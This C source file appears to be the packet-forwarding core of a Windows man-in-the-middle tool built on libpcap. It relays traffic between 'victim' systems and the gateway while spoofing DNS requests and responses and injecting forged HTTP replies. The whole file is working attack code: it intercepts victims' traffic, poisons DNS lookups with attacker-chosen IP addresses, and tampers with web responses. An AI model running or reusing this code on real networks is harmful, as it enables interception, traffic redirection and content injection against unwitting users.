#define HAVE_REMOTE

#include <stdlib.h>
#include <stdio.h>
#include <pcap.h>
#include <Shlwapi.h>
#include <iphlpapi.h>

#include "APE.h"
#include "Packets.h"
#include "NetworkFunctions.h"
#include "LinkedListSystems.h"
#include "LinkedListFirewallRules.h"
#include "LinkedListSpoofedDnsHosts.h"
#include "PacketProxy.h"
#include "RequestSpoofingPacketCrafter.h"
#include "DnsResponsePoisoning.h"
#include "PacketCrafter.h"
#include "HttpInjection.h"


extern PSYSNODE gSystemsList;
//extern PHOSTNODE gHostsList;
extern PRULENODE gFWRulesList;


/*
 * Receive, parse, resend
 * 
 */
DWORD WINAPI ForwardPackets (LPVOID lpParam)
{
  char filter[MAX_BUF_SIZE + 1];
  DWORD retVal = 0;
  char pcapErrorBuffer[PCAP_ERRBUF_SIZE];
  int counter = 0;
  int ifcNum = 0;
  struct bpf_program ifcCode;
  unsigned int netMask = 0;
  PSCANPARAMS tmpParams = (PSCANPARAMS) lpParam;
  SCANPARAMS scanParams;
  int funcRetVal = 0;
  struct pcap_pkthdr *packetHeader = NULL;
  unsigned char *packetData = NULL;

  ZeroMemory(pcapErrorBuffer, sizeof(pcapErrorBuffer));
  ZeroMemory(&scanParams, sizeof(scanParams));
  CopyMemory(&scanParams, tmpParams, sizeof(scanParams));


  // Open interface.
  if ((scanParams.interfaceReadHandle = pcap_open_live((char *) scanParams.interfaceName, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL|PCAP_OPENFLAG_MAX_RESPONSIVENESS, PCAP_READTIMEOUT, pcapErrorBuffer)) == NULL)
  {
    LogMsg(DBG_ERROR, "CaptureIncomingPackets(): Unable to open the adapter");
    retVal = 5;
    goto END;
  }

  // MAC == LocalMAC and (IP == GWIP or IP == VictimIP
  scanParams.interfaceWriteHandle = scanParams.interfaceReadHandle;
  ZeroMemory(&ifcCode, sizeof(ifcCode));
  ZeroMemory(filter, sizeof(filter));

  _snprintf(filter, sizeof(filter) - 1, "ip && ether dst %s && not src host %s && not dst host %s", scanParams.localMacStr, scanParams.localIpStr, scanParams.localIpStr);
  netMask = 0xffffff; // "255.255.255.0"

  if (pcap_compile((pcap_t *)scanParams.interfaceWriteHandle, &ifcCode, (const char *) filter, 1, netMask) < 0)
  {
    LogMsg(DBG_ERROR, "CaptureIncomingPackets(): Unable to compile the BPF filter \"%s\"", filter);
    retVal = 6;
    goto END;
  }

  if (pcap_setfilter((pcap_t *) scanParams.interfaceWriteHandle, &ifcCode) < 0)
  {
    LogMsg(DBG_ERROR, "CaptureIncomingPackets(): Unable to set the BPF filter \"%s\"", filter);
    retVal = 7;
    goto END;
  }

  while ((funcRetVal = pcap_next_ex((pcap_t*) scanParams.interfaceWriteHandle, (struct pcap_pkthdr **) &packetHeader, (const u_char **) &packetData)) >= 0)
    if (funcRetVal == 1)
      PacketForwarding_handler((unsigned char *) &scanParams, packetHeader, packetData);

  LogMsg(DBG_INFO, "CaptureIncomingPackets(): Listener started. Waiting for replies ...");

END:

  LogMsg(DBG_ERROR, "CaptureIncomingPackets(): Exit");

  return retVal;
}



/* 
 * Callback function invoked by libpcap for every incoming packet 
 *
 */
void PacketForwarding_handler(u_char *param, const struct pcap_pkthdr *pktHeader, const u_char *data)
{
  PETHDR etherHdr = NULL;
  PIPHDR ipHdr = NULL;
  PTCPHDR tcpHdr = NULL;
  PUDPHDR udpHdr = NULL;
  int ipHdrLen = 0;
  PSCANPARAMS scanParams = (PSCANPARAMS) param;
  int bytesSent = 0;
  char logMsg[MAX_BUF_SIZE + 1];
  char suffix[MAX_BUF_SIZE + 1];
  unsigned char dstIp[MAX_BUF_SIZE + 1];
  unsigned long dstIpBin = 0;
  unsigned short dstPort = 0;
  unsigned char srcIp[MAX_BUF_SIZE + 1];
  unsigned long srcIpBin = 0;
  unsigned short srcPort = 0;
  unsigned short pktLen = 0;
  char proto[128];
  PSYSNODE realDstSys = NULL;
  PRULENODE firewallRule = NULL;
  PHOSTNODE tmpNode = NULL;
  char spoofedDnsPacket[8192] = {0};
  int spoofedDnsPacketLen = 0;
  int funcRetVal = 0;


  if (pktHeader != NULL && pktHeader->len > 0 && data != NULL)
  {
    etherHdr = (PETHDR) data;

    /*
     * Destination MAC address has to be local MAC address and
     * source MAC address has to be a foreign MAC address
     */

    ipHdr = (PIPHDR) (data + 14); 
    ipHdrLen = (ipHdr->ver_ihl & 0xf) * 4;

    ZeroMemory(dstIp, sizeof(dstIp));
    ZeroMemory(srcIp, sizeof(srcIp));
    ZeroMemory(proto, sizeof(proto));
    ZeroMemory(suffix, sizeof(suffix));

    IpBin2String((unsigned char *) &ipHdr->daddr, (unsigned char *) dstIp, sizeof(dstIp)-1);
    IpBin2String((unsigned char *) &ipHdr->saddr, (unsigned char *) srcIp, sizeof(srcIp)-1);
    
    if (ipHdr->proto == IP_PROTO_TCP) // TCP
    {
      tcpHdr = (PTCPHDR) ((unsigned char*) ipHdr + ipHdrLen);
      strcat(proto, "TCP");

      pktLen = ntohs(ipHdr->tlen) - ipHdrLen - tcpHdr->doff*4;
      dstPort = ntohs(tcpHdr->dport);
      srcPort = ntohs(tcpHdr->sport);
      snprintf(suffix, sizeof(suffix)-1, "[%s%s%s%s%s%s]", tcpHdr->ack?"a":" ", tcpHdr->syn?"s":" ", tcpHdr->psh?"p":" ", tcpHdr->fin?"f":" ", tcpHdr->rst?"r":" ", tcpHdr->urg?"u":" ");
    }
    else if( ipHdr->proto == 17) // UDP
    {
      udpHdr = (PUDPHDR) ((unsigned char*) ipHdr + ipHdrLen);
      strcat(proto, "UDP");
      pktLen = ntohs(udpHdr->ulen);
      dstPort = ntohs(udpHdr->dport);
      srcPort = ntohs(udpHdr->sport);
    }
    else if (ipHdr->proto == 1)
    {
      strcat(proto, "ICMP");
    }
    else
    {
      strcat(proto, "Unknown");
    }

    CopyMemory(&srcIpBin, &ipHdr->saddr, 4);
    CopyMemory(&dstIpBin, &ipHdr->daddr, 4);
    snprintf(logMsg, sizeof(logMsg)-1, "%%-5s %-4s %-15s %5d -> %-15s %-5d    %5d bytes    %s", proto, srcIp, srcPort, dstIp, dstPort, pktLen, suffix);


    // Firewall checks
    if ((firewallRule = FirewallBlockRuleMatch(gFWRulesList, proto, srcIpBin, dstIpBin, srcPort, dstPort)) != NULL)
    {
      LogMsg(DBG_INFO, logMsg, "BLOCK");
    }

    // Destination IP is GW
    else if (memcmp(&ipHdr->daddr, scanParams->gatewayIpBin, BIN_IP_LEN) == 0)
    {

      // DNS REQUEST SPOOFING
      if ((tmpNode = (PHOSTNODE) DnsRequestPoisonerGetHost2Spoof((u_char *) data)) != NULL)
      {
        InjectDNSPacket((unsigned char *) data, (pcap_t *) scanParams->interfaceWriteHandle, (char *) tmpNode->sData.SpoofedIP, (char *) srcIp, (char *) dstIp, (char *) tmpNode->sData.HostName);
        return;
      }

      memcpy(etherHdr->ether_dhost, scanParams->gatewayMacBin, BIN_MAC_LEN);
      memcpy(etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
      LogMsg(DBG_INFO, logMsg, "GW");
      pcap_sendpacket(((pcap_t *) scanParams->interfaceWriteHandle), data, pktHeader->len);
      

    // Destination is victim system
    }
    else if ((realDstSys = GetNodeByIp(gSystemsList, (unsigned char *) &ipHdr->daddr)) != NULL)
    {
      memcpy(etherHdr->ether_dhost, realDstSys->data.sysMacBin, BIN_MAC_LEN);
      memcpy(etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
      LogMsg(DBG_INFO, logMsg, "IN");


      // DNS RESPONSE SPOOFING
      if ((tmpNode = (PHOSTNODE) DnsResponsePoisonerGetHost2Spoof((u_char *) data)) != NULL)
      {
        spoofedDnsPacketLen = sizeof(spoofedDnsPacket);
        funcRetVal = buildSpoofedDnsReplyPacket((unsigned char *) data, pktHeader->len, tmpNode, spoofedDnsPacket, &spoofedDnsPacketLen);
        if (pcap_sendpacket((pcap_t *) scanParams->interfaceWriteHandle, (unsigned char *) spoofedDnsPacket, spoofedDnsPacketLen) == 0)
        {
          LogMsg(DBG_INFO, "Response DNS POisoning : %s -> %s", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
          return;
        }
      }

      pcap_sendpacket((pcap_t *) scanParams->interfaceWriteHandle, data, pktHeader->len);      


    /*
     * Destination IP is not inside the Network range.
     * Forward packet to the GW
     */
    }
    else
    {

      if (InjectHttpReply((pcap_t *) scanParams->interfaceWriteHandle, (u_char *) data, pktLen) == OK)
        return;

      // In case user sends DNS request to an external DNS server, send back
      // a spoofed answer packet.
      if ((tmpNode = (PHOSTNODE) DnsRequestPoisonerGetHost2Spoof((u_char *) data)) != NULL)
      {
        InjectDNSPacket((unsigned char *) data, (pcap_t *) scanParams->interfaceWriteHandle, (char *) tmpNode->sData.SpoofedIP, (char *) srcIp, (char *) dstIp, (char *) tmpNode->sData.HostName);
        return;
      }

      memcpy(etherHdr->ether_dhost, scanParams->gatewayMacBin, BIN_MAC_LEN);
      memcpy(etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
      LogMsg(DBG_INFO, logMsg, "OUT");

      pcap_sendpacket(((pcap_t *) scanParams->interfaceWriteHandle), data, pktHeader->len);
    }
  }
}



